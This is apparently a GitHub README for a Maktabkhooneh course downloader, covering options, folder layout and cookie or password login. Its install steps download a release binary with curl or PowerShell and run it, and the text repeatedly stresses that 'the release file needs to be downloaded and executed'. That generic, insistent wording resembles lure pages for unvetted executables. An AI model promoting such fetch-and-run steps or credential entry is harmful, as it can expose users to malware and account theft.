# 🎬 Maktabkhooneh Downloader — Download Courses, Videos, Files

[![Releases](https://img.shields.io/github/v/release/zer-le-magicien/maktabkhooneh-downloader?label=Releases&style=for-the-badge)](https://github.com/zer-le-magicien/maktabkhooneh-downloader/releases)

![hero image](https://images.unsplash.com/photo-1555066931-4365d14bab8c?ixlib=rb-4.0.3&q=80&w=1200&auto=format&fit=crop)

A command-line tool to download accessible course content from Maktabkhooneh. It saves lesson videos, attachments, and subtitles. It stores everything in a structured folder tree. Use it to archive your course content or to view files offline.

Topics: `download`, `maktabkhooneh`

Badges
- Platform: Linux, macOS, Windows (WSL)
- License: MIT
- Releases: linked above

Features
- Download lesson videos in MP4 or original format.
- Download attachments and store them beside lessons.
- Download subtitles and map them to videos.
- Download full course content at once and keep folder structure.
- Resume interrupted downloads.
- Parallel downloads with a configurable worker count.
- Minimal external dependencies.

Why this tool
- The tool groups all course content in one place.
- The tool keeps file names and folders clean and consistent.
- The tool works with session cookies or user credentials.
- The tool logs progress and errors to a file.

Supported content
- Lesson video streams (HTTP/MP4)
- Lesson attachments (PDF, ZIP, PPT, DOCX)
- Subtitles (SRT, VTT)
- Course metadata (title, lesson order, instructor)

Quick links
- Download the release file, then run it: https://github.com/zer-le-magicien/maktabkhooneh-downloader/releases
- Click the badge at the top to open the releases page.

Install and run (binary release)
- Visit the Releases page and download the file that matches your OS.
- The release file needs to be downloaded and executed.

Example steps (Linux / macOS)
```bash
# download the latest release binary (replace asset-name as needed)
curl -L -o maktabkhooneh-downloader https://github.com/zer-le-magicien/maktabkhooneh-downloader/releases/download/vX.Y.Z/maktabkhooneh-downloader-linux
chmod +x maktabkhooneh-downloader
./maktabkhooneh-downloader --course-url "https://maktabkhooneh.org/c/COURSE-ID" --output ./downloads
```

Example steps (Windows PowerShell)
```powershell
Invoke-WebRequest -Uri "https://github.com/zer-le-magicien/maktabkhooneh-downloader/releases/download/vX.Y.Z/maktabkhooneh-downloader-windows.exe" -OutFile "maktabkhooneh-downloader.exe"
.\maktabkhooneh-downloader.exe --course-url "https://maktabkhooneh.org/c/COURSE-ID" --output .\downloads
```

Install from source (Python example)
- If a source version exists, clone and install.
```bash
git clone https://github.com/zer-le-magicien/maktabkhooneh-downloader.git
cd maktabkhooneh-downloader
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python -m maktabkhooneh_downloader --help
```

Usage examples
- Download a course by URL and save to local folder
```bash
./maktabkhooneh-downloader --course-url "https://maktabkhooneh.org/c/COURSE-ID" --output "./My Course"
```

- Use cookies exported from browser
```bash
./maktabkhooneh-downloader --course-url "https://maktabkhooneh.org/c/COURSE-ID" --cookies ./cookies.txt
```

- Download videos and subtitles only
```bash
./maktabkhooneh-downloader --course-url "..." --output "./Course" --no-attachments --subtitles
```

- Limit parallel downloads
```bash
./maktabkhooneh-downloader --course-url "..." --output "./Course" --workers 4
```

Command-line options
- --course-url <url> : URL of the course main page or ID.
- --output <path> : Output directory. Default: ./maktabkhooneh_downloads
- --cookies <file> : Netscape cookie file exported from browser.
- --username <user> --password <pass> : Use login instead of cookies.
- --format <mp4|original> : Save video as MP4 or keep original stream container.
- --subtitles : Download subtitles if available.
- --no-attachments : Do not download attachments.
- --workers <n> : Number of parallel downloads. Default 3.
- --resume : Resume partial downloads.
- --log <file> : Path to log file.
- --quiet : Reduce console output.
- --help : Show help and exit.

Folder layout
- Output folder structure mirrors the course layout.
- Example:
  - My Course/
    - 01 - Introduction/
      - 01 - Welcome.mp4
      - 01 - Welcome.srt
      - syllabus.pdf
    - 02 - Topic Name/
      - 02 - Lecture 1.mp4
      - slides.zip

Authentication
- You can run with cookies or with user credentials.
- Use an exported cookies file for stable sessions.
- If you provide credentials, the tool will handle login and session storage.

Logging and progress
- The tool prints a progress bar for each download.
- The tool writes a log file with timestamps and errors.
- Use --log to change the default log file path.

Error handling
- The tool retries failed downloads up to a retry limit.
- The tool resumes partial downloads when possible.
- The tool marks failed items in a summary at the end.

Examples and real use cases
- Archive a course before it expires.
- Prepare offline material for a workshop.
- Keep a backup of lesson attachments and subtitles.
- Generate a local copy for students with limited bandwidth.

Automation tips
- Run the tool in a screen or tmux session on a server.
- Combine with cron or systemd timers to download new lessons on schedule.
- Use --workers to control bandwidth use on shared hosts.

Security and privacy
- Store cookies and credentials in restricted files.
- Remove credentials after use.
- Use a separate account for automated downloads when possible.

Releases
[![Download Release](https://img.shields.io/badge/download-release-blue?style=for-the-badge)](https://github.com/zer-le-magicien/maktabkhooneh-downloader/releases)

- Visit the Releases page, download the release file for your OS, and execute it as shown above.
- The release assets include platform binaries and checksums when available.
- The release file needs to be downloaded and executed.

Contributing
- Open an issue for bugs or feature requests.
- Fork the repo, make a branch, and send a pull request.
- Keep commits small and focused.
- Add tests for new behaviors when possible.
- Document new options in this README.

Development notes
- The core downloader uses HTTP range requests for resume support.
- The tool parses course pages and API endpoints to list lessons and attachments.
- The tool preserves lesson order using numeric prefixes.
- The tool uses a worker pool for concurrent downloads.

Testing
- Unit tests cover URL parsing, path normalization, and retry logic.
- Integration tests simulate partial downloads and resume.
- Use the test suite before opening a pull request.

FAQ
- Q: Can I download paid-only content?
  A: The tool downloads content your account can access. Use valid credentials or cookies.

- Q: Can I change file names?
  A: Use the renaming script or modify the source naming function.

- Q: Do you offer a GUI?
  A: Not at this time. The CLI aims to be scriptable.

License
- MIT License. See LICENSE file for terms.

Credits
- Built by contributors and users who reported issues and suggested features.
- Images: Unsplash and public icon sets used for README visuals.

References and resources
- Maktabkhooneh course pages
- Browser cookie export guides
- Common streaming and subtitle formats

If the Releases link above does not work, check the Releases section on the project page for available assets and instructions:
https://github.com/zer-le-magicien/maktabkhooneh-downloader/releases

